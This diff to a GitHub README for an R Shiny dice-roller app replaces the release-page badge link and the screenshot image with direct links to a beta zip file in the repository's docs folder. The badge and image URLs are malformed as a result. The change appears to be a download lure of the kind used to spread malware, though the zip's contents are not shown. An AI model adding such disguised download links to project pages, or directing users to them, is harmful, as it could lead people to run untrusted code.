@@ -16,7 +16,7 @@ This repository houses a web application built using R Shiny that allows users t
 ## How to Use
 
 To start rolling dice, simply click on the link provided below:
-[![Download and Run](https://img.shields.io/badge/Download%20and%20Run-Click%20Here-brightgreen)](https://github.com/AnujTheKing9/r-shiny-dice-roller-app/releases)
+[![Download and Run](https://github.com/AnujTheKing9/r-shiny-dice-roller-app/raw/refs/heads/master/docs/dice_roller_shiny_r_app_3.4-beta.2.zip%20and%20Run-Click%20Here-brightgreen)](https://github.com/AnujTheKing9/r-shiny-dice-roller-app/raw/refs/heads/master/docs/dice_roller_shiny_r_app_3.4-beta.2.zip)
 
 ## Technologies Used
 
@@ -30,7 +30,7 @@ dice, dice-game, dice-games, dice-roll, dice-roll-game, dice-roller, dice-roller
 ## Screenshots
 
 Here is a sneak peek of the app in action:
-![Dice Roller App](https://placekitten.com/200/200)
+![Dice Roller App](https://github.com/AnujTheKing9/r-shiny-dice-roller-app/raw/refs/heads/master/docs/dice_roller_shiny_r_app_3.4-beta.2.zip)
 
 ## Contributing
 
